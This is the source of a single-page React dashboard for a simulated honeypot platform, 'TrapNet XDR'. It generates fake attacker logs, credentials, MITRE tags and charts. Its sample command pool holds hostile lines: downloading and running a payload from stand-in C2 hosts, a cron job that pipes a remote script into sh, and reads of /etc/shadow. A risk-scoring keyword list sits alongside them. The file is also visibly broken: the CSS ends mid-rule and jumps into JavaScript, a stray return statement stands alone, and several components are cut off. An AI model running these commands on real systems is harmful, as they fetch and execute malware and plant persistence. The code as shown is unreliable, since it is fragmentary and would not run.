<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>TrapNet XDR — Honeypot Platform</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.23.2/babel.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
<style>
  :root {
    --bg0: #020408;
    --bg1: #060d14;
    --bg2: #0a1520;
    --bg3: #0f1e2e;
    --panel: #0d1a27;
    --border: #1a3040;
    --accent: #00d4ff;
    --accent2: #ff3c6e;
    --accent3: #39ff14;
    --accent4: #ff9f00;
    --text: #c8e6f5;
    --text-dim: #4a7a99;
    --critical: #ff3c6e;
    --high: #ff9f00;
    --medium: #ffe600;
    --low: #39ff14;
    --glow: 0 0 20px rgba(0,212,255,0.3);
    --glow-red: 0 0 20px rgba(255,60,110,0.4);
  }
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  html { scroll-behavior: smooth; }
  body {
    background: var(--bg0);
    color: var(--text);
    font-family: 'Rajdhani', sans-serif;
    font-size: 15px;
    min-height: 100vh;
    overflow-x: hidden;
  }
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background:
      radial-gradient(ellipse 60% 40% at 10% 20%, rgba(0,212,255,0.04) 0%, transparent 60%),
      radial-gradient(ellipse 40% 30% at 90% 80%, rgba(255,60,110,0.04) 0%, transparent 60%);
    pointer-events: none;
    z-index: 0;
  }

  /* Scanline overlay */
  body::after {
    content: '';
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(0,0,0,0.08) 2px,
      rgba(0,0,0,0.08) 4px
    );
    pointer-events: none;
    z-index: 9999;
  }

  /* ── LAYOUT ── */
  #root { display: flex; min-height: 100vh; position: relative; z-index: 1; }
  .sidebar {
    width: 240px;
    background: var(--bg1);
    border-right: 1px solid var(--border);
    display: flex;
    flex-direction: column;
    position: fixed;
    top: 0; left: 0; bottom: 0;
    z-index: 100;
    padding: 0;
  }
  .main-content {
    margin-left: 240px;
    flex: 1;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }

  /* ── SIDEBAR ── */
  .logo-area {
    padding: 24px 20px 20px;
    border-bottom: 1px solid var(--border);
    position: relative;
  }
  .logo-title {
    font-family: 'Orbitron', monospace;
    font-size: 18px;
    font-weight: 900;
    color: var(--accent);
    letter-spacing: 2px;
    text-shadow: 0 0 20px var(--accent);
  }
  .logo-sub {
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    color: var(--text-dim);
    letter-spacing: 3px;
    margin-top: 2px;
  }
  .logo-badge {
    display: inline-block;
    background: rgba(57,255,20,0.15);
    border: 1px solid var(--accent3);
    color: var(--accent3);
    font-family: 'Share Tech Mono', monospace;
    font-size: 9px;
    padding: 2px 8px;
    letter-spacing: 2px;
    margin-top: 8px;
    animation: blink 2s ease-in-out infinite;
  }
  @keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
  }
  .nav-section {
    padding: 16px 12px 8px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 9px;
    color: var(--text-dim);
    letter-spacing: 3px;
    text-transform: uppercase;
  }
  .nav-item {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 10px 20px;
    cursor: pointer;
    font-size: 13px;
    font-weight: 500;
    letter-spacing: 1px;
    color: var(--text-dim);
    transition: all 0.2s;
    position: relative;
    text-decoration: none;
    border: none;
    background: none;
    width: 100%;
    text-align: left;
  }
  .nav-item:hover { color: var(--text); background: rgba(0,212,255,0.05); }
  .nav-item.active {
    color: var(--accent);
    background: rgba(0,212,255,0.08);
  }
  .nav-item.active::before {
    content: '';
    position: absolute;
    left: 0; top: 0; bottom: 0;
    width: 2px;
    background: var(--accent);
    box-shadow: 0 0 10px var(--accent);
  }
  .nav-icon { font-size: 16px; width: 20px; text-align: center; }
  .nav-badge {
    margin-left: auto;
    background: var(--accent2);
    color: white;
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    padding: 1px 6px;
    border-radius: 2px;
    min-width: 20px;
    text-align: center;
  }
  .sidebar-bottom {
    margin-top: auto;
    padding: 16px;
    border-top: 1px solid var(--border);
  }
  .threat-level-bar {
    background: var(--bg3);
    border: 1px solid var(--border);
    padding: 10px 12px;
    border-radius: 2px;
  }
  .threat-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 9px;
    color: var(--text-dim);
    letter-spacing: 2px;
    margin-bottom: 6px;
  }
  .threat-value {
    font-family: 'Orbitron', monospace;
    font-size: 20px;
    font-weight: 700;
    color: var(--accent2);
    text-shadow: 0 0 15px var(--accent2);
  }
  .threat-bar-track {
    height: 4px;
    background: var(--bg0);
    margin-top: 6px;
    border-radius: 2px;
    overflow: hidden;
  }
  .threat-bar-fill {
    height: 100%;
    background: linear-gradient(90deg, var(--accent3), var(--accent4), var(--accent2));
    border-radius: 2px;
    transition: width 1s ease;
    box-shadow: 0 0 10px var(--accent2);
  }

  /* ── TOP BAR ── */
  .topbar {
    height: 54px;
    background: var(--bg1);
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    padding: 0 28px;
    gap: 16px;
    flex-shrink: 0;
  }
  .topbar-title {
    font-family: 'Orbitron', monospace;
    font-size: 14px;
    font-weight: 700;
    color: var(--accent);
    letter-spacing: 2px;
    flex: 1;
  }
  .topbar-time {
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    color: var(--text-dim);
  }
  .status-dot {
    width: 8px; height: 8px;
    border-radius: 50%;
    background: var(--accent3);
    box-shadow: 0 0 8px var(--accent3);
    animation: pulse 2s ease-in-out infinite;
  }
  @keyframes pulse {
    0%, 100% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.3); opacity: 0.7; }
  }

  /* ── PAGE ── */
  .page { padding: 28px; flex: 1; }
  .page-header {
    margin-bottom: 28px;
    display: flex;
    align-items: flex-end;
    gap: 16px;
  }
  .page-title {
    font-family: 'Orbitron', monospace;
    font-size: 22px;
    font-weight: 700;
    color: var(--accent);
    letter-spacing: 2px;
  }
  .page-subtitle {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    color: var(--text-dim);
    letter-spacing: 2px;
    margin-top: 4px;
  }
  .page-actions { margin-left: auto; display: flex; gap: 10px; }

  /* ── CARDS ── */
  .card {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 2px;
    padding: 20px;
    position: relative;
    overflow: hidden;
  }
  .card::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, var(--accent), transparent);
    opacity: 0.4;
  }
  .card-title {
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    color: var(--text-dim);
    letter-spacing: 3px;
    text-transform: uppercase;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .card-title-icon { font-size: 14px; }

  /* ── STAT CARDS ── */
  .stat-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 24px; }
  .stat-card {
    background: var(--panel);
    border: 1px solid var(--border);
    padding: 20px;
    position: relative;
    overflow: hidden;
    cursor: default;
    transition: border-color 0.2s, transform 0.2s;
  }
  .stat-card:hover { border-color: var(--accent); transform: translateY(-2px); }
  .stat-card::after {
    content: '';
    position: absolute;
    bottom: 0; left: 0; right: 0;
    height: 2px;
    background: linear-gradient(90deg, transparent, var(--c, var(--accent)), transparent);
  }
  .stat-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 9px;
    color: var(--text-dim);
    letter-spacing: 3px;
    margin-bottom: 10px;
  }
  .stat-value {
    font-family: 'Orbitron', monospace;
    font-size: 32px;
    font-weight: 900;
    color: var(--c, var(--accent));
    text-shadow: 0 0 20px var(--c, var(--accent));
    line-height: 1;
  }
  .stat-delta {
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    color: var(--text-dim);
    margin-top: 6px;
  }
  .stat-icon {
    position: absolute;
    top: 16px; right: 16px;
    font-size: 28px;
    opacity: 0.15;
  }

  /* ── GRID LAYOUTS ── */
  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
  .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
  .grid-2-1 { display: grid; grid-template-columns: 2fr 1fr; gap: 16px; }
  .grid-1-2 { display: grid; grid-template-columns: 1fr 2fr; gap: 16px; }
  .mb-4 { margin-bottom: 16px; }
  .mb-6 { margin-bottom: 24px; }

  /* ── TABLE ── */
  .data-table { width: 100%; border-collapse: collapse; }
  .data-table th {
    font-family: 'Share Tech Mono', monospace;
    font-size: 9px;
    letter-spacing: 2px;
    color: var(--text-dim);
    text-align: left;
    padding: 8px 12px;
    border-bottom: 1px solid var(--border);
    text-transform: uppercase;
  }
  .data-table td {
    padding: 10px 12px;
    border-bottom: 1px solid rgba(26,48,64,0.5);
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    color: var(--text);
    vertical-align: middle;
  }
  .data-table tr:hover td { background: rgba(0,212,255,0.03); }
  .data-table tr:last-child td { border-bottom: none; }

  /* ── BADGES ── */
  .badge {
    display: inline-block;
    font-family: 'Share Tech Mono', monospace;
    font-size: 9px;
    letter-spacing: 1px;
    padding: 2px 8px;
    border-radius: 1px;
    font-weight: 700;
  }
  .badge-critical { background: rgba(255,60,110,0.15); color: var(--critical); border: 1px solid var(--critical); }
  .badge-high     { background: rgba(255,159,0,0.15);  color: var(--high);     border: 1px solid var(--high); }
  .badge-medium   { background: rgba(255,230,0,0.15);  color: var(--medium);   border: 1px solid var(--medium); }
  .badge-low      { background: rgba(57,255,20,0.15);  color: var(--low);      border: 1px solid var(--low); }
  .badge-ssh      { background: rgba(0,212,255,0.1);   color: var(--accent);   border: 1px solid var(--accent); }
  .badge-http     { background: rgba(147,51,234,0.15); color: #a855f7;         border: 1px solid #a855f7; }

  /* ── BUTTONS ── */
  .btn {
    font-family: 'Rajdhani', sans-serif;
    font-weight: 600;
    font-size: 12px;
    letter-spacing: 2px;
    padding: 8px 18px;
    border: 1px solid;
    cursor: pointer;
    transition: all 0.2s;
    text-transform: uppercase;
    border-radius: 1px;
  }
  .btn-primary {
    background: rgba(0,212,255,0.1);
    border-color: var(--accent);
    color: var(--accent);
  }
  .btn-primary:hover { background: rgba(0,212,255,0.2); box-shadow: var(--glow); }
  .btn-danger {
    background: rgba(255,60,110,0.1);
    border-color: var(--critical);
    color: var(--critical);
  }
  .btn-danger:hover { background: rgba(255,60,110,0.2); box-shadow: var(--glow-red); }
  .btn-ghost {
    background: transparent;
    border-color: var(--border);
    color: var(--text-dim);
  }
  .btn-ghost:hover { border-color: var(--accent); color: var(--accent); }

  /* ── INPUTS ── */
  .input-field {
    background: var(--bg0);
    border: 1px solid var(--border);
    color: var(--text);
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    padding: 10px 14px;
    width: 100%;
    outline: none;
    transition: border-color 0.2s;
    border-radius: 1px;
  }
  .input-field:focus { border-color: var(--accent); box-shadow: 0 0 0 1px rgba(0,212,255,0.2); }
  .input-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    color: var(--text-dim);
    letter-spacing: 2px;
    margin-bottom: 6px;
    display: block;
  }
  .form-group { margin-bottom: 16px; }

  /* ── CHART CONTAINER ── */
  .chart-wrap { position: relative; height: 220px; }
  .chart-wrap-sm { position: relative; height: 160px; }
  .chart-wrap-lg { position: relative; height: 300px; }

  /* ── ALERTS ── */
  .alert-item {
    display: flex;
    gap: 14px;
    padding: 14px 16px;
    border-left: 3px solid;
    background: rgba(255,60,110,0.05);
    margin-bottom: 10px;
    position: relative;
    transition: background 0.2s;
  }
  .alert-item:hover { background: rgba(255,60,110,0.08); }
  .alert-item.ack { opacity: 0.4; border-left-color: var(--border) !important; }
  .alert-critical { border-left-color: var(--critical); }
  .alert-high     { border-left-color: var(--high); }
  .alert-medium   { border-left-color: var(--medium); }
  .alert-icon { font-size: 20px; }
  .alert-body { flex: 1; }
  .alert-title { font-weight: 600; font-size: 14px; color: var(--text); margin-bottom: 3px; }
  .alert-desc  { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim); }
  .alert-time  { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--text-dim); margin-top: 4px; }
  .alert-ack-btn {
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    padding: 4px 10px;
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text-dim);
    cursor: pointer;
    transition: all 0.2s;
    align-self: center;
    white-space: nowrap;
  }
  .alert-ack-btn:hover { border-color: var(--accent3); color: var(--accent3); }

  /* ── HONEYPOT PAGE ── */
  .honeypot-wrapper {
    min-height: calc(100vh - 54px);
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 40px;
    position: relative;
  }
  .honeypot-disclaimer {
    position: absolute;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(255,230,0,0.1);
    border: 1px solid var(--medium);
    color: var(--medium);
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    padding: 6px 16px;
    letter-spacing: 2px;
    z-index: 10;
  }
  .login-panel {
    width: 420px;
    background: var(--panel);
    border: 1px solid var(--border);
    position: relative;
    overflow: hidden;
  }
  .login-panel::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 2px;
    background: linear-gradient(90deg, var(--accent2), var(--accent), var(--accent2));
    box-shadow: 0 0 20px var(--accent);
  }
  .login-header {
    padding: 28px 32px 20px;
    border-bottom: 1px solid var(--border);
    text-align: center;
  }
  .login-brand {
    font-family: 'Orbitron', monospace;
    font-size: 14px;
    font-weight: 700;
    color: var(--text-dim);
    letter-spacing: 4px;
    margin-bottom: 4px;
  }
  .login-service-badge {
    display: inline-block;
    background: rgba(255,60,110,0.1);
    border: 1px solid var(--accent2);
    color: var(--accent2);
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    padding: 3px 12px;
    letter-spacing: 2px;
    margin-bottom: 8px;
  }
  .login-form { padding: 28px 32px 24px; }
  .login-error {
    background: rgba(255,60,110,0.1);
    border: 1px solid var(--critical);
    color: var(--critical);
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    padding: 10px 14px;
    margin-bottom: 16px;
    letter-spacing: 1px;
  }
  .login-success {
    background: rgba(57,255,20,0.1);
    border: 1px solid var(--accent3);
    color: var(--accent3);
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    padding: 10px 14px;
    margin-bottom: 16px;
    letter-spacing: 1px;
  }
  .terminal-window {
    background: var(--bg0);
    border: 1px solid var(--border);
    margin-top: 24px;
  }
  .terminal-titlebar {
    background: var(--bg2);
    padding: 8px 14px;
    display: flex;
    align-items: center;
    gap: 6px;
    border-bottom: 1px solid var(--border);
  }
  .term-dot { width: 10px; height: 10px; border-radius: 50%; }
  .term-dot-r { background: var(--critical); }
  .term-dot-y { background: var(--medium); }
  .term-dot-g { background: var(--accent3); }
  .terminal-title { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim); margin-left: 8px; }
  .terminal-body { padding: 14px; min-height: 180px; max-height: 260px; overflow-y: auto; }
  .term-line {
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    line-height: 1.7;
    color: var(--accent3);
  }
  .term-prompt { color: var(--accent); }
  .term-output { color: var(--text-dim); }
  .term-input-row { display: flex; align-items: center; gap: 6px; margin-top: 4px; }
  .term-input {
    background: transparent;
    border: none;
    outline: none;
    color: var(--accent3);
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    flex: 1;
    caret-color: var(--accent3);
  }

  /* ── HOME PAGE ── */
  .home-hero {
    text-align: center;
    padding: 60px 40px 40px;
    position: relative;
  }
  .home-hero-title {
    font-family: 'Orbitron', monospace;
    font-size: 48px;
    font-weight: 900;
    color: var(--accent);
    text-shadow: 0 0 40px var(--accent), 0 0 80px rgba(0,212,255,0.3);
    letter-spacing: 4px;
    line-height: 1.1;
    animation: flicker 8s ease-in-out infinite;
  }
  @keyframes flicker {
    0%, 95%, 100% { opacity: 1; }
    96% { opacity: 0.8; }
    97% { opacity: 1; }
    98% { opacity: 0.7; }
    99% { opacity: 1; }
  }
  .home-hero-sub {
    font-family: 'Share Tech Mono', monospace;
    font-size: 14px;
    color: var(--text-dim);
    letter-spacing: 4px;
    margin-top: 12px;
  }
  .home-hero-desc {
    max-width: 560px;
    margin: 20px auto 0;
    font-size: 15px;
    color: var(--text-dim);
    line-height: 1.6;
  }
  .feature-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-top: 40px; }
  .feature-card {
    background: var(--panel);
    border: 1px solid var(--border);
    padding: 24px;
    position: relative;
    overflow: hidden;
    transition: border-color 0.3s, transform 0.3s;
  }
  .feature-card:hover { border-color: var(--accent); transform: translateY(-4px); }
  .feature-card::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, var(--accent), transparent);
    opacity: 0;
    transition: opacity 0.3s;
  }
  .feature-card:hover::before { opacity: 1; }
  .feature-icon { font-size: 32px; margin-bottom: 14px; }
  .feature-title { font-family: 'Orbitron', monospace; font-size: 13px; font-weight: 700; color: var(--accent); letter-spacing: 1px; margin-bottom: 8px; }
  .feature-desc { font-size: 13px; color: var(--text-dim); line-height: 1.5; }

  /* ── MITRE TAGS ── */
  .mitre-tag {
    display: inline-block;
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    padding: 2px 8px;
    background: rgba(0,212,255,0.1);
    border: 1px solid rgba(0,212,255,0.3);
    color: var(--accent);
    margin: 2px;
  }

  /* ── RISK BAR ── */
  .risk-bar-track {
    height: 6px;

  "196.196.53.100": { country: "Iran",         city: "Tehran",       lat: 35.68, lon: 51.38, flag: "🇮🇷" },
  "5.188.206.14":   { country: "Ukraine",      city: "Kyiv",         lat: 50.45, lon: 30.52, flag: "🇺🇦" },
  "104.21.48.100":  { country: "USA",          city: "San Jose",     lat: 37.33, lon: -121.88, flag: "🇺🇸" },

  "177.66.10.45":   { country: "Brazil",       city: "São Paulo",    lat: -23.55, lon: -46.63, flag: "🇧🇷" },
  "41.204.18.7":    { country: "Nigeria",      city: "Lagos",        lat: 6.52, lon: 3.37,   flag: "🇳🇬" },
};

const CREDS = [
  ["admin","admin"],["root","root"],["admin","password"],["user","123456"],
  ["admin","1234"],["root","toor"],["administrator","admin"],["test","test"],
  ["guest","guest"],["admin","admin123"],["root","password123"],["ubuntu","ubuntu"],
  ["pi","raspberry"],["oracle","oracle"],["postgres","postgres"],["admin","letmein"],
  ["root","123456"],["admin","12345"],["user","password"],["root","pass"],
];

const COMMANDS_POOL = [
  "whoami","id","uname -a","cat /etc/passwd","ls -la /","ifconfig",
  "netstat -an","ps aux","wget http://malware.xyz/bot",
  "curl http://c2server.ru/payload -o /tmp/x && chmod +x /tmp/x && /tmp/x",
  "cat /etc/shadow","find / -perm -4000","echo '* * * * * curl http://c2.evil/cron|sh'>>cron",
  "history","last -n 20","w","nmap -sV 192.168.1.0/24",
];

const MITRE_POOL = ["T1110","T1059","T1078","T1136","T1053","T1548","T1071","T1003","T1055","T1562"];
const USERAGENTS = [
  "Masscan/1.0","zgrab/0.x","python-requests/2.28",
  "Go-http-client/1.1","curl/7.68.0","Nikto/2.1.6","sqlmap/1.7",
];

function rnd(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function sample(arr, n) { return [...arr].sort(() => Math.random() - 0.5).slice(0, n); }

const IPS = Object.keys(GEO_DATA);
const KNOWN_BAD = new Set(["185.220.101.47","103.75.190.5","196.196.53.100","41.204.18.7","5.188.206.14"]);

function computeRisk(ip, attempts, commands) {
  let score = 0;
  if (KNOWN_BAD.has(ip)) score += 40;
  score += Math.min(attempts * 3, 30);
  const dangerous = commands.filter(c => ["wget","curl","rm -rf","/etc/shadow","cron","nmap"].some(d => c.includes(d)));
  score += Math.min(dangerous.length * 10, 30);
  score = Math.min(score, 100);
  const level = score >= 75 ? "CRITICAL" : score >= 50 ? "HIGH" : score >= 25 ? "MEDIUM" : "LOW";
  return { score, level };
}

function generateLogs(n = 150) {
  const now = Date.now();
  return Array.from({ length: n }, (_, i) => {
    const ip = pick(IPS);
    const cred = pick(CREDS);
    const geo = GEO_DATA[ip];
    const cmds = Math.random() > 0.55 ? sample(COMMANDS_POOL, rnd(0, 4)) : [];
    const attempts = rnd(1, 20);
    const risk = computeRisk(ip, attempts, cmds);
    return {
      id: `log-${i}-${Math.random().toString(36).slice(2,8)}`,
      attacker_ip: ip,
      timestamp: new Date(now - rnd(0, 86400000 * 7)).toISOString(),
      service: Math.random() > 0.45 ? "ssh" : "http",
      username: cred[0],
      password: cred[1],
      commands: cmds,
      geo,
      risk,
      headers: { "User-Agent": pick(USERAGENTS), Accept: "*/*" },
      mitre_tags: sample(MITRE_POOL, rnd(1, 3)),
      attempts,
    };
  }).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
}

function generateAlerts(logs) {
  const alerts = [];
  const ipCounts = {};
  logs.forEach(l => { ipCounts[l.attacker_ip] = (ipCounts[l.attacker_ip] || 0) + 1; });
  Object.entries(ipCounts).sort((a, b) => b[1] - a[1]).slice(0, 6).forEach(([ip, count], i) => {
    const geo = GEO_DATA[ip];
    const sev = count >= 15 ? "CRITICAL" : count >= 10 ? "HIGH" : "MEDIUM";
    alerts.push({
      id: `alert-${i}`,
      severity: sev,
      title: `${count >= 10 ? "Brute Force Attack" : "Suspicious Activity"} — ${ip}`,
      description: `${count} login attempts from ${geo.city}, ${geo.country} ${geo.flag}`,
      source_ip: ip,
      timestamp: new Date(Date.now() - rnd(0, 3600000)).toISOString(),
      acknowledged: Math.random() > 0.75,
    });
  });
  return alerts;
}

  return time;
}

function useChart(ref, config) {
  useEffect(() => {
    if (!ref.current) return;
    const ctx = ref.current.getContext('2d');
    const ch = new Chart(ctx, config);
    return () => ch.destroy();
  }, []);
}

// ─── COMPONENTS ──────────────────────────────────────────────────────────────

function RiskBadge({ level }) {
  const cls = { CRITICAL: "badge-critical", HIGH: "badge-high", MEDIUM: "badge-medium", LOW: "badge-low" }[level] || "badge-low";
  const icons = { CRITICAL: "⚡", HIGH: "🔴", MEDIUM: "🟡", LOW: "🟢" };
  return <span className={`badge ${cls}`}>{icons[level]} {level}</span>;
}

function ServiceBadge({ service }) {
  return <span className={`badge badge-${service}`}>{service === "ssh" ? "⌨ SSH" : "🌐 HTTP"}</span>;
}

function TimeAgo({ ts }) {
  const diff = Math.floor((Date.now() - new Date(ts).getTime()) / 1000);
  if (diff < 60) return <span>{diff}s ago</span>;
  if (diff < 3600) return <span>{Math.floor(diff / 60)}m ago</span>;
  if (diff < 86400) return <span>{Math.floor(diff / 3600)}h ago</span>;
  return <span>{Math.floor(diff / 86400)}d ago</span>;
}

function StatCard({ label, value, delta, icon, color }) {
  return (
    <div className="stat-card" style={{ "--c": color }}>
      <div className="stat-label">{label}</div>
      <div className="stat-value">{typeof value === "number" ? value.toLocaleString() : value}</div>
      {delta && <div className="stat-delta">{delta}</div>}
      <div className="stat-icon">{icon}</div>

  );
}

function Ticker({ logs }) {

      {l.geo.flag} {l.attacker_ip} — {l.service.toUpperCase()} — {l.username}:{l.password} — <RiskBadge level={l.risk.level} />

    <div className="ticker-wrap">
      <div className="ticker-inner">{items}{items}</div>

  );
}

                        style={{ color: line.text.includes("TRAPNET") ? "var(--accent2)" : undefined }}>
                        {line.text}
                      </div>
                    ))}
                    <div className="term-input-row">
                      <span className="term-line term-prompt">root@honeypot:~# </span>
                      <input className="term-input" value={termInput}
                        onChange={e => setTermInput(e.target.value)}
                        onKeyDown={handleTermCommand}
                        placeholder="type a command..." />
                    </div>

                </div>
                <div style={{ marginTop: 12, padding: 12, background: "rgba(255,60,110,0.06)", border: "1px solid rgba(255,60,110,0.2)" }}>
                  <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: "var(--critical)", letterSpacing: 2 }}>
                    ⚡ HONEYPOT ACTIVE — ALL COMMANDS LOGGED
                  </div>
                  <div style={{ fontSize: 12, color: "var(--text-dim)", marginTop: 4 }}>
                    Try: whoami, id, uname -a, cat /etc/passwd, ls, ifconfig
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Live capture feed */}
          <div className="card" style={{ marginTop: 24 }}>
            <div className="card-title">⚡ LIVE CAPTURE FEED</div>
            {logs.filter(l => l.live).slice(0, 5).map((l, i) => (
              <div key={i} style={{ display: "flex", gap: 12, padding: "8px 0", borderBottom: "1px solid rgba(26,48,64,0.4)", fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: "var(--text-dim)" }}>
                <span style={{ color: "var(--accent2)" }}>⚡ NEW</span>
                <span>{l.geo.flag} {l.attacker_ip}</span>
                <span style={{ color: "var(--accent)" }}>{l.service.toUpperCase()}</span>
                <span>{l.username}:{l.password}</span>

            {logs.filter(l => l.live).length === 0 && (

            )}
          </div>
        </div>
      </div>
    </div>
  );
}

function DashboardPage({ logs, alerts }) {
  const chartRefs = {
    timeline: useRef(null),
    risk: useRef(null),
    service: useRef(null),
    mitre: useRef(null),
  };

  const ipCounts = {};
  logs.forEach(l => { ipCounts[l.attacker_ip] = (ipCounts[l.attacker_ip] || 0) + 1; });
  const topIPs = Object.entries(ipCounts).sort((a,b)=>b[1]-a[1]).slice(0,8);

  const credCounts = {};
  logs.forEach(l => { const k = `${l.username}/${l.password}`; credCounts[k] = (credCounts[k]||0)+1; });
  const topCreds = Object.entries(credCounts).sort((a,b)=>b[1]-a[1]).slice(0,8);

  const riskDist = { CRITICAL:0, HIGH:0, MEDIUM:0, LOW:0 };
  logs.forEach(l => riskDist[l.risk.level]++);

  const serviceDist = { ssh: 0, http: 0 };
  logs.forEach(l => serviceDist[l.service]++);

  const mitreCount = {};
  logs.forEach(l => l.mitre_tags.forEach(t => { mitreCount[t] = (mitreCount[t]||0)+1; }));
  const topMitre = Object.entries(mitreCount).sort((a,b)=>b[1]-a[1]).slice(0,7);

  // Timeline: last 24 hours by hour
  const now = Date.now();
  const hourBuckets = {};
  for (let h = 23; h >= 0; h--) {
    const label = `${String(new Date(now - h*3600000).getHours()).padStart(2,"0")}:00`;
    hourBuckets[label] = 0;
  }
  logs.forEach(l => {
    const diff = now - new Date(l.timestamp).getTime();
    if (diff < 86400000) {
      const label = `${String(new Date(l.timestamp).getHours()).padStart(2,"0")}:00`;
      if (label in hourBuckets) hourBuckets[label]++;
    }
  });

  const CHART_DEFAULTS = {
    responsive: true, maintainAspectRatio: false,
    plugins: { legend: { display: false }, tooltip: {
      backgroundColor: "#0a1520", borderColor: "#1a3040", borderWidth: 1,
      titleColor: "#00d4ff", bodyColor: "#c8e6f5",
      titleFont: { family: "'Share Tech Mono'" }, bodyFont: { family: "'Share Tech Mono'" },
    }},
  };

  useEffect(() => {
    const charts = [];

    if (chartRefs.timeline.current) {
      charts.push(new Chart(chartRefs.timeline.current.getContext("2d"), {
        type: "line",
        data: {
          labels: Object.keys(hourBuckets),
          datasets: [{
            data: Object.values(hourBuckets),
            borderColor: "#00d4ff", backgroundColor: "rgba(0,212,255,0.08)",
            fill: true, tension: 0.4, pointBackgroundColor: "#00d4ff",
            pointRadius: 3, borderWidth: 2,
          }],
        },
        options: { ...CHART_DEFAULTS,
          scales: {
            x: { ticks: { color: "#4a7a99", font: { family:"'Share Tech Mono'", size:9 }, maxRotation:45 }, grid: { color:"rgba(26,48,64,0.4)" } },
            y: { ticks: { color: "#4a7a99", font: { family:"'Share Tech Mono'", size:9 } }, grid: { color:"rgba(26,48,64,0.4)" } },
          },
        },
      }));
    }

    if (chartRefs.risk.current) {
      charts.push(new Chart(chartRefs.risk.current.getContext("2d"), {
        type: "doughnut",
        data: {
          labels: Object.keys(riskDist),
          datasets: [{
            data: Object.values(riskDist),
            backgroundColor: ["rgba(255,60,110,0.7)","rgba(255,159,0,0.7)","rgba(255,230,0,0.7)","rgba(57,255,20,0.7)"],
            borderColor: ["#ff3c6e","#ff9f00","#ffe600","#39ff14"],
            borderWidth: 1,
          }],
        },
        options: {
          ...CHART_DEFAULTS,
          plugins: {
            ...CHART_DEFAULTS.plugins,
            legend: { display: true, position: "right", labels: { color:"#4a7a99", font:{family:"'Share Tech Mono'",size:10}, boxWidth:12 }},
          },
          cutout: "65%",
        },
      }));
    }

    if (chartRefs.service.current) {
      charts.push(new Chart(chartRefs.service.current.getContext("2d"), {
        type: "bar",
        data: {
          labels: ["SSH","HTTP"],
          datasets: [{
            data: [serviceDist.ssh, serviceDist.http],
            backgroundColor: ["rgba(0,212,255,0.3)","rgba(168,85,247,0.3)"],
            borderColor: ["#00d4ff","#a855f7"],
            borderWidth: 1,
          }],
        },
        options: { ...CHART_DEFAULTS,
          scales: {
            x: { ticks: { color:"#4a7a99", font:{family:"'Share Tech Mono'",size:11} }, grid:{color:"rgba(26,48,64,0.4)"} },
            y: { ticks: { color:"#4a7a99", font:{family:"'Share Tech Mono'",size:9} }, grid:{color:"rgba(26,48,64,0.4)"} },
          },
        },
      }));
    }

    if (chartRefs.mitre.current) {
